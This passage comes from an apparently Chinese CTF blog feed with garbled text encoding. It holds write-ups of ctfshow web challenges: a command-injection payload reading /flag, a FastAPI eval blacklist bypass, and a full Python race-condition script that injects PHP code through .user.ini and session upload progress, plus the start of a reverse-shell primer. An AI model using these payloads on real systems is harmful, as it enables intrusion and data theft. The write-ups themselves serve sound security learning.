current,path, request.app .debug</span><br></pre></td></tr></table></figure><p>ç›®çš„å°±æ˜¯è®©currentå˜æˆ.. å®ç°ç›®å½•ç©¿è¶Š</p><p>çœ‹ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(<span class="variable language_">self</span>.base) :].strip(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä»ç»™å®šçš„è·¯å¾„ä¸­å»é™¤åŸºæœ¬è·¯å¾„ï¼ˆ`self.base`ï¼‰ï¼Œç„¶åè¿”å›å‰©ä½™è·¯å¾„ã€‚é¦–å…ˆï¼Œ`path.strip(&quot;/&quot;)` å»é™¤è·¯å¾„ä¸¤ç«¯çš„æ–œæ ï¼Œç„¶å`[len(self.base):]` å–åŸºæœ¬è·¯å¾„ä¹‹åçš„éƒ¨åˆ†ï¼Œæœ€å`.strip(&quot;/&quot;)` å†æ¬¡å»é™¤å‰©ä½™è·¯å¾„ä¸¤ç«¯çš„æ–œæ </span><br><span class="line"></span><br><span class="line">#å¯ä»¥çœ‹åˆ°currentçš„å€¼å°±æ˜¯ç”±pathå’Œbaseä¸¤ä¸ªå€¼å†³å®šçš„</span><br></pre></td></tr></table></figure><p>self.baseæ˜¯å¯æ§çš„</p><p><strong>é‚£ä¹ˆæˆ‘ä»¬å°±å¾—æ„é€ currentçš„å€¼</strong></p><p>å…³é”®å°±åœ¨äºä¸‹é¢</p><p>æ‰€ä»¥å®ç°ç›®å½•ç©¿è¶Šåªè¦è®©pathçš„å€¼ä¸ºstatic&#x2F;ä¸€ä¸ªç›®å½•&#x2F; currentå€¼ä¸º..å°±å¥½äº†</p><p>ä½†æ˜¯è¿™ä¸ªç›®å½•æ€ä¹ˆæ¥ï¼Ÿ</p><p><strong>file_or_directory</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ä»¥æ”¹å˜é™æ€æ–‡ä»¶çš„é»˜è®¤è·¯å¾„</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬åªéœ€è¦é€šè¿‡è¿™ä¸ªæ”¹å˜åˆ°å…¶ä»–ç›®å½•ï¼Œè¯¥ç›®å½•ä¸‹å­˜åœ¨å…¶ä»–ç›®å½•ä¸å°±å¥½äº†</span><br></pre></td></tr></table></figure><p>å®ƒå¯ä»¥æ”¹å˜staticçš„é»˜è®¤è·¯å¾„</p><p>è¿™å°±æ˜¯ä¸Šé¢ä¸ºä»€ä¹ˆéœ€è¦ä¼ å…¥æ¶æ„çš„key,ç›®çš„å°±æ˜¯è®©æ—¥å¿—è®°å½•ï¼Œè·å¾—ä¸€ä¸ªæŠ¥é”™çš„ç›®å½•</p><p>ç»§ç»­æ”¹å˜ç›®å½•ä½ç½®ï¼ˆä¸Šé¢æ”¹çš„æ˜¯&#x2F;tmpï¼‰ç„¶åä¿®æ”¹å…¶baseçš„å€¼ä¸ºè‡ªå·±æŠ¥é”™çš„ç›®å½•</p><p>å°±çœ‹å®ç°ç›®å½•ç©¿è¶Šäº†</p><p>ile_or_directoryåªæ˜¯æ”¹å˜å®ƒè¯†åˆ«çš„è·¯å¾„ï¼Œå¹¶ä¸ä¼šæ”¹å˜</p><p>self.directoryä¸­partsçš„å€¼ï¼Œè¿™ä¸ªåˆ—ç›®å½•çš„å€¼ä¾æ—§æ˜¯é»˜è®¤çš„</p>]]></content>
      
      
      <categories>
          
          <category> pollute </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowåŸè°…æ¯</title>
      <link href="/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸè°…4"><a href="#åŸè°…4" class="headerlink" title="åŸè°…4"></a>åŸè°…4</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>])?<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>]):<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>å‘ç°xbxå¯ä»¥rce</p><p>ls å‘ç°</p><p>index.php yuanliang_4_xxx.zip</p><p>å¹¶ä¸”flagåœ¨&#x2F;ç›®å½•é‡Œé¢</p><p>ç›´æ¥catå‘ç°ä¸è¡Œ</p><p>æˆ‘ä»¬ls &#x2F;binç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin ç›®å½•æ˜¯ Unix/Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªé‡è¦ç›®å½•,å®ƒå­˜æ”¾ç€è®¸å¤šå¸¸ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶(äºŒè¿›åˆ¶æ–‡ä»¶)ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸æ˜¯ç³»ç»Ÿç®¡ç†å‘˜æˆ–æ™®é€šç”¨æˆ·ç»å¸¸ä½¿ç”¨çš„åŸºæœ¬å‘½ä»¤å’Œåº”ç”¨ç¨‹åº</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå‘ç°sh rm ls è¿™ä¸‰ä¸ªå‘½ä»¤å¯ä»¥æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shæ˜¯ä¸€ä¸ªè½»é‡çº§çš„shell,ç›¸æ¯”äºbashç­‰æ›´é«˜çº§çš„shell,å®ƒæä¾›äº†æ›´åŸºç¡€çš„åŠŸèƒ½ã€‚ä½†å®ƒä»ç„¶æ˜¯è®¸å¤šç³»ç»Ÿç®¡ç†ä»»åŠ¡çš„é¦–é€‰shellã€‚</span><br></pre></td></tr></table></figure><p>æ˜æ˜¾è®©æˆ‘ä»¬ç”¨shæ¥åšé¢˜ç›®</p><p>shä¹Ÿå¯ä»¥åƒcatä¸€æ ·è¯»å–æ–‡ä»¶å†…å®¹ä½†æ˜¯æœ‰ä¸€ç‚¹ä¸åŒ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# cat Gu0f3n.txt</span><br><span class="line">Gu0f3n</span><br><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# sh Gu0f3n.txt</span><br><span class="line">Gu0f3n.txt: line 1: Gu0f3n: command not found</span><br></pre></td></tr></table></figure><p>ä»–ä¼šæŠ¥é”™ command not found</p><p>å› ä¸ºå½“å‘½ä»¤ä¸è¢«æ­£å¸¸æ‰§è¡Œåˆ™ä¼šæŠ¥é”™</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨linuxé‡å®šå‘é”™è¯¯è¾“å‡º</p><p>æˆ‘ä»¬éƒ½çŸ¥é“åœ¨æ–‡ä»¶æè¿°ç¬¦ä¸­0ï¼Œ1ï¼Œ2 åˆ†è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯è¾“å‡º</p><p>å…¶æ¬¡æˆ‘ä»¬éœ€è¦äº†è§£è§„å¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.æ ‡å‡†è¾“å…¥0ã€è¾“å‡º1ã€é”™è¯¯2éœ€è¦åˆ†åˆ«é‡å®šå‘ï¼Œä¸€ä¸ªé‡å®šå‘åªèƒ½æ”¹å˜å®ƒä»¬ä¸­çš„ä¸€ä¸ª</span><br><span class="line">2. æ ‡å‡†è¾“å…¥0å’Œæ ‡å‡†è¾“å‡º1å¯ä»¥çœç•¥ã€‚ï¼ˆå½“å…¶å‡ºç°é‡å®šå‘ç¬¦å·å·¦ä¾§æ—¶ï¼‰  </span><br><span class="line">3. æ–‡ä»¶æè¿°ç¬¦åœ¨é‡å®šå‘ç¬¦å·å·¦ä¾§æ—¶ç›´æ¥å†™å³å¯ï¼Œåœ¨å³ä¾§æ—¶å‰é¢åŠ &amp; </span><br><span class="line">4.  æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘ç¬¦å·ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼</span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_29491885/article/details/111050189">https://blog.csdn.net/weixin_29491885/article/details/111050189</a></p><p>é‚£ä¹ˆè¿™é“é¢˜ç›®æˆ‘ä»¬</p><p>ç”¨shè¯»å–&#x2F;flagçš„å†…å®¹å°†ä»–çš„æŠ¥é”™è¾“å‡º</p><p>sh &#x2F;flag 2&gt;%261</p><p>éœ€è¦å§œ&amp;urlç¼–ç ä¸º%26</p><p>paylod:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xbx=sh%20/flag%202&gt;%261</span><br></pre></td></tr></table></figure><h2 id="åŸè°…5-fastapi2"><a href="#åŸè°…5-fastapi2" class="headerlink" title="åŸè°…5_fastapi2"></a>åŸè°…5_fastapi2</h2><p>æ‰“å¼€é¢˜ç›®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;â€œä½ å¥½â€ï¼šâ€œfastapi2â€&#125;</span><br></pre></td></tr></table></figure><p>fast api2</p><p>é¦–å…ˆå°±æ˜¯äº†è§£fastapi2è¿™ä¸ªä¸œè¥¿</p><p>FastAPI æ˜¯ä¸€ä¸ªç°ä»£ã€å¿«é€Ÿï¼ˆé«˜æ€§èƒ½ï¼‰çš„ Web æ¡†æ¶ï¼Œç”¨äºæ„å»ºåŸºäº Python çš„ **<a href="https://apifox.com/apiskills/understanding-apis/">API</a>**ã€‚å®ƒæ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ŒåŸºäº Starlette å’Œ Pydantic åº“æ„å»ºè€Œæˆï¼Œæä¾›äº†å¼ºå¤§çš„åŠŸèƒ½å’Œé«˜æ•ˆçš„æ€§èƒ½ã€‚</p><p>åœ¨ FastAPI ä¸­ï¼Œ<code>/docs</code> è·¯ç”±æä¾›äº†ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆçš„äº¤äº’å¼ API æ–‡æ¡£ç•Œé¢ã€‚è¿™æ˜¯ FastAPI çš„ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ç‰¹æ€§ï¼Œç”¨äºæŸ¥çœ‹å’Œæµ‹è¯• API çš„å„ä¸ªç«¯ç‚¹</p><p>åœ¨æ›´å…·é¢˜ç›®ç»™çš„æç¤º</p><p>è¿›å…¥è·¯ç”±</p><p>å‘ç°ä¸‰ä¸ªå‡½æ•°</p><p>å…¶ä¸­ç¬¬äºŒä¸ªcalc</p><p>æ ¹æ®æç¤ºç»™çš„é»‘åå•</p><p>æˆ‘ä»¬å±•ç¤ºå…¨å±€å˜é‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure><p><img src="/imgs/3.png"></p><p>å‘ç°å¯ç–‘çš„å˜é‡youdontknow</p><p>å±•ç¤ºè¿™ä¸ªå˜é‡å‘ç°ä¸€å †è¿‡æ»¤å¾—åˆ°å…³é”®è¯</p><p>æˆ‘ä»¬ç”¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">youdontknow.clear()</span><br></pre></td></tr></table></figure><p>clearæ‰è¿‡æ»¤çš„å…³é”®è¯è¯­</p><p>æœ€åç›´æ¥è¯»flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="/imgs/4.png"></p><h3 id="fastapi2-for-é˜¿ç‹¸"><a href="#fastapi2-for-é˜¿ç‹¸" class="headerlink" title="fastapi2 for é˜¿ç‹¸"></a>fastapi2 for é˜¿ç‹¸</h3><p><strong>å’Œ5ä¸€æ ·</strong></p><p>clearæ‰</p><p>å—¨å—¨</p><h2 id="åŸè°…6-web3"><a href="#åŸè°…6-web3" class="headerlink" title="åŸè°…6_web3"></a>åŸè°…6_web3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line">(<span class="title function_ invoke__">waf_file</span>(<span class="variable">$file</span>)&amp;&amp;<span class="title function_ invoke__">waf_content</span>(<span class="variable">$content</span>))?(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>)):<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´å°±æ˜¯ä½ è¾“è¿›å»çš„æ–‡ä»¶ä¸åœ¨wafçš„ç»•è¿‡é‡Œé¢å°±å¯ä»¥äº†</p><p>ç»•è¿‡çš„ä¸œè¥¿å¾ˆå¤šä½†æ˜¯æ²¡æœ‰ç»•è¿‡**.user.ini**</p><p>.user.ini æ–‡ä»¶æ˜¯<strong>PHP ä¸­ç”¨äºé…ç½®ç‰¹å®šç›®å½•çš„è®¾ç½®çš„ç‰¹æ®Šæ–‡ä»¶</strong>ã€‚ å®ƒç±»ä¼¼äºApache æœåŠ¡å™¨ä¸­çš„ . htaccess æ–‡ä»¶ï¼Œä½†ä»…é€‚ç”¨äºPHPã€‚ .user.ini æ–‡ä»¶å…è®¸ç”¨æˆ·ä¸ºç‰¹å®šç›®å½•å®šä¹‰PHP é…ç½®æŒ‡ä»¤ï¼Œè¿™äº›é…ç½®æŒ‡ä»¤å°†åœ¨è¯¥ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ä¸­çš„PHP è„šæœ¬æ‰§è¡Œæ—¶ç”Ÿæ•ˆã€‚</p><p><code>.user.ini</code> æ–‡ä»¶çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†å…è®¸éç®¡ç†å‘˜ç”¨æˆ·è‡ªå®šä¹‰æŸäº› PHP é…ç½®é€‰é¡¹ï¼Œè€Œä¸éœ€è¦è®¿é—®ä¸» <code>php.ini</code> æ–‡ä»¶ã€‚è¿™æ ·ï¼Œä¸åŒçš„åº”ç”¨ç¨‹åºæˆ–ç”¨æˆ·å¯ä»¥åœ¨è‡ªå·±çš„ç›®å½•ä¸­è®¾ç½®ç‰¹å®šçš„ PHP é…ç½®ï¼Œè€Œä¸å½±å“æ•´ä¸ªæœåŠ¡å™¨çš„é…ç½®ã€‚</p><p>è¿™é‡Œçš„è€ƒç‚¹å°±æ˜¯sessionå’Œ.user.iniçš„æ¡ä»¶ç«äº‰</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p><strong>auto_prepend_file è¡¨ç¤ºåœ¨phpç¨‹åºåŠ è½½åº”ç”¨ç¨‹åºå‰åŠ è½½æŒ‡å®šçš„phpæ–‡ä»¶</strong></p><p>GETï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=.user.ini</span><br></pre></td></tr></table></figure><p>POST:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/tmp/sess_Gu0f3n</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ä¸‹å¤§ä½¬çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Authorï¼šY4tacker</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Gu0f3n&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://c41b9ab0-e1f5-4e05-b75c-a7ea64fa3d91.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat ./flag.php&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Gu0f3n.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">&quot;waf.php&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="comment"># ç¬¬ä¸€æ­¥ä¸Šä¼ .user.iniæ–‡ä»¶ï¼Œå°†æˆ‘ä»¬çš„sessionæ–‡ä»¶å†…å®¹æ·»åŠ åˆ°é»˜è®¤å¤´</span></span><br><span class="line">        y4tacker = &#123;</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="string">&quot;auto_prepend_file=/tmp/sess_&quot;</span> + sessid</span><br><span class="line">        &#125;</span><br><span class="line">        session.post(url + <span class="string">&quot;?file=.user.ini&quot;</span>, data=y4tacker)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//$flag=&#x27;ctfshow&#123;d78ac2f0-9b57-4159-a162-6b944e7b495b&#125;&#x27;;</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1721961458;s:14:&quot;content_length&quot;;i:51487;s:15:&quot;bytes_processed&quot;;i:5259;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:10:&quot;Gu0f3n.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1721961458;s:15:&quot;bytes_processed&quot;;i:5259;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2024çš„ä¸€äº›åæ€</title>
      <link href="/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/"/>
      <url>/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯åå¼¹shell"><a href="#ä»€ä¹ˆæ˜¯åå¼¹shell" class="headerlink" title="ä»€ä¹ˆæ˜¯åå¼¹shell"></a><strong>ä»€ä¹ˆæ˜¯åå¼¹shell</strong></h3><p>reverse shellï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP&#x2F;UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚reverse shellä¸telnetï¼Œsshç­‰æ ‡å‡†shellå¯¹åº”ï¼Œæœ¬è´¨ä¸Šæ˜¯ç½‘ç»œæ¦‚å¿µçš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è§’è‰²åè½¬ã€‚</p><span id="more"></span><!-- more --><!-- more --><p>æ­£å‘è¿æ¥</p><p>å°±æ˜¯æˆ‘ä»¬å®¢æˆ·ç«¯è¿æœåŠ¡å™¨</p><p>æˆ‘ä»¬å«åšæ­£å‘è¿æ¥ã€‚è¿œç¨‹æ¡Œé¢ã€webæœåŠ¡ã€sshã€telnetç­‰ç­‰éƒ½æ˜¯æ­£å‘è¿æ¥</p><p>åå‘è¿æ¥</p><p>å°±æ˜¯è®©æœåŠ¡å™¨è¿æˆ‘ä»¬</p><p>ä¸€èˆ¬é€‚ç”¨äº</p><ul><li>ç›®æ ‡æœºå› é˜²ç«å¢™å—é™ï¼Œç›®æ ‡æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚ã€‚</li><li>ç›®æ ‡æœºç«¯å£è¢«å ç”¨ã€‚</li><li>ç›®æ ‡æœºä½äºå±€åŸŸç½‘ï¼Œæˆ–IPä¼šåŠ¨æ€å˜åŒ–ï¼Œæ”»å‡»æœºæ— æ³•ç›´æ¥è¿æ¥ã€‚</li><li>å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºï¼Œéƒ½æ˜¯æœªçŸ¥çš„</li><li>å‘webé‡Œé¢çš„è¯æœ‰å¯èƒ½å‡ºç°åœ¨rceå½“ä¸­è¿‡æ»¤çš„å‡½æ•°å®åœ¨å¤ªå¤šï¼Œæˆ‘ä»¬åªèƒ½å»å®ç°åå‘è¿shell</li></ul><h3 id="å¸¸è§çš„æ–¹å¼"><a href="#å¸¸è§çš„æ–¹å¼" class="headerlink" title="å¸¸è§çš„æ–¹å¼"></a><strong>å¸¸è§çš„æ–¹å¼</strong></h3><ul><li><p>Bashåå¼¹shell</p></li><li><p>é¦–å…ˆæˆ‘ä»¬å…ˆäº†è§£ä¸‹Linuxçš„è¿æ¥ç¬¦å·å’Œé‡å®šå‘</p></li><li><p><strong>ä»€ä¹ˆæ˜¯é‡å®šå‘ï¼š</strong></p></li><li><p>Linuxä¸­çš„é‡å®šå‘å°±æ˜¯<strong>å°†åŸæœ¬è¦è¾“å‡ºåˆ°å±å¹•ä¸­çš„æ•°æ®ä¿¡æ¯,é‡æ–°æŒ‡å‘æŸä¸ªç‰¹å®šæ–‡ä»¶å½“ä¸­</strong>ï¼Œæˆ–è€…å®šå‘åˆ°é»‘æ´æ–‡ä»¶ï¼ˆ&#x2F;dev&#x2F;nullï¼‰ä¸­ã€‚</p></li><li><p><strong>é‡å®šå‘çš„ä½œç”¨:</strong></p><ul><li><p>å½“å±å¹•è¾“å‡ºçš„ä¿¡æ¯å¾ˆé‡è¦,å¸Œæœ›ä¿å­˜æ—¶</p></li><li><p>åå°æ‰§è¡Œçš„ç¨‹åºä¸€èˆ¬éƒ½ä¼šæœ‰è¾“å‡ºï¼Œä¸å¸Œæœ›å®ƒè¾“å‡ºå¹²æ‰°åˆ°ç»ˆç«¯</p></li><li><p>æ‰§è¡Œå®šæ—¶å¤‡ä»½ä»»åŠ¡ï¼Œå¸Œæœ›å°†å¤‡ä»½ç»“æœä¿ç•™ä¸‹æ¥æ—¶</p></li><li><p>æ‰§è¡Œä¸€äº›å‘½ä»¤,ä¼šæç¤ºä¸€äº›æŠ¥é”™ä¿¡æ¯,å¯ä»¥ç›´æ¥å°†æŠ¥é”™ä¸¢å¼ƒã€‚</p></li><li><p>æ‰§è¡Œå‘½ä»¤æ—¶å¸Œæœ›å°†æŠ¥é”™å’Œæ­£ç¡®å†…å®¹åŒºåˆ†åœ¨ä¸åŒæ–‡ä»¶ä¸­æ—¶ï¼ˆæ—¥å¿—ï¼‰</p></li><li><ol><li><h2 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a><strong>æ–‡ä»¶æè¿°ç¬¦</strong></h2></li></ol></li><li><blockquote><ol><li>æ–‡ä»¶æè¿°ç¬¦æ˜¯IOé‡å®šå‘ä¸­çš„é‡è¦æ¦‚å¿µã€‚æ–‡ä»¶æè¿°ç¬¦ä½¿ç”¨æ•°å­—è¡¨ç¤ºï¼Œå®ƒæŒ‡æ˜äº†æ•°æ®çš„æµå‘ç‰¹å¾ã€‚</li></ol></blockquote></li></ul></li></ul><p>åœ¨Linuxä¸­æˆ‘ä»¬åˆ†åˆ«ä½¿ç”¨æè¿°ç¬¦0ï¼Œ1ï¼Œ2è¡¨ç¤º</p><p>è¿™ä¸‰ä¸ªé»˜è®¤çš„ç¬¦å·æ–‡ä»¶åˆ†åˆ«æ˜¯ç»ˆç«¯å­—ç¬¦è®¾å¤‡çš„è½¯è¿æ¥&#x2F;dev&#x2F;stdinã€&#x2F;dev&#x2F;stdoutã€&#x2F;dev&#x2F;srderr</p><p>è¡¨ç¤ºæ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€å’ŒæŠ¥é”™</p><p>å½“è¿›ç¨‹æ“ä½œä¸€ä¸ªæ–‡ä»¶æ—¶ï¼š</p><p>é¦–å…ˆç¨‹åºæ˜¯æ— æ³•ç›´æ¥è®¿é—®ç¡¬ä»¶ï¼Œéœ€è¦å€ŸåŠ©å†…æ ¸æ¥è®¿é—®æ–‡ä»¶</p><p>è€Œå†…æ ¸kerneléœ€è¦åˆ©ç”¨æ–‡ä»¶æè¿°ï¼ˆfile descriptorï¼‰æ¥è®¿é—®</p><p>æ€»ç»“ï¼šè¿›ç¨‹ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥ç®¡ç†æ‰“å¼€çš„æ–‡ä»¶å¯¹åº”å…³ç³»</p><p><strong>é€šå¸¸ç¨‹åºè®¿é—®ä¸€ä¸ªæ–‡ä»¶è‡³å°‘ä¼šæ‰“å¼€ä¸‰ä¸ªæ ‡å‡†æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯æ ‡å‡†è¾“å…¥ï¼Œ<strong><strong>æ ‡å‡†è¾“å‡º</strong></strong>ï¼Œé”™è¯¯è¾“å‡º</strong></p><p><strong>è¿›ç¨‹å°†ä»æ ‡å‡†è¾“å…¥ä¸­çš„åˆ°æ•°æ®ï¼Œå°†æ­£å¸¸è¾“å‡ºæ‰“å°è‡³å±å¹•ç»ˆç«¯ï¼Œå°†é”™è¯¯çš„è¾“å‡ºä¿¡æ¯ä¹Ÿæ‰“å°è‡³å±å¹•ç»ˆç«¯</strong></p><h2 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a><strong>é‡å®šå‘</strong></h2><p>æˆ‘ä»¬ä½¿ç”¨&gt;æˆ–è€…&gt;&gt;æ—¶ç¬¦å·<strong>å·¦è¾¹</strong>è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ²¡æœ‰çš„è¯é»˜è®¤<strong>æ˜¯1</strong>ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ç¬¦å·å³è¾¹å¯ä»¥æ˜¯æ–‡ä»¶ä¹Ÿå¯ä»¥æ˜¯è¾“å‡ºè®¾å¤‡ï¼ˆlinuxä¸­ä¸‡ç‰©éƒ½æ˜¯æ–‡ä»¶ï¼Œä¸”è®¾å¤‡ä¹Ÿæ˜¯æ–‡ä»¶ï¼‰<strong>å½“ä½¿ç”¨&gt;æ—¶ï¼Œä¼šåˆ¤æ–­å³è¾¹çš„æ–‡ä»¶å­˜ä¸å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨çš„è¯å°±å…ˆåˆ 